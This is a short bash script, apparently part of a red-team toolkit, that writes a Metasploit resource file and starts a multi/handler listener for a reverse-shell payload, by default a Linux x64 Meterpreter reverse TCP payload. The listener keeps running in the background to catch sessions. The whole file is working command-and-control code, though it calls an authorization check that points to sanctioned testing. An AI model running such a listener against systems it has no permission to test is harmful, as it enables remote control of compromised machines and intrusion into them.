#!/usr/bin/env bash
# c2/msf-handler.sh — Metasploit multi-handler for a chosen payload.
#
# Inputs:
#   PAYLOAD       — e.g. linux/x64/meterpreter/reverse_tcp (default)
#   LHOST         — listener bind / external IP
#   LPORT         — listener port
#   STAGED        — yes/no, default yes (stageless is also fine)

PHASE="c2-msf"
. "$(dirname "$0")/_lib.sh"
require_authorization

if ! command -v msfconsole >/dev/null 2>&1; then
    log ERR "msfconsole not installed (apt install metasploit-framework)"
    exit 4
fi

PAYLOAD="${PAYLOAD:-linux/x64/meterpreter/reverse_tcp}"
LHOST="${LHOST:-$LISTEN_HOST}"
LPORT="${LPORT:-$LISTEN_PORT}"
EXIT_ON_SESSION="${EXIT_ON_SESSION:-no}"

D=$(state_dir msf)
RC="$D/handler.rc"

cat > "$RC" <<EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession $EXIT_ON_SESSION
exploit -j -z
EOF

log INFO "msfconsole multi-handler:"
log INFO "  payload: $PAYLOAD"
log INFO "  bind:    $LHOST:$LPORT"
log INFO "  rc file: $RC"
log INFO ""
log INFO "launching (Ctrl+C to exit msfconsole; the handler keeps running -j)"
sleep 2
msfconsole -q -r "$RC"
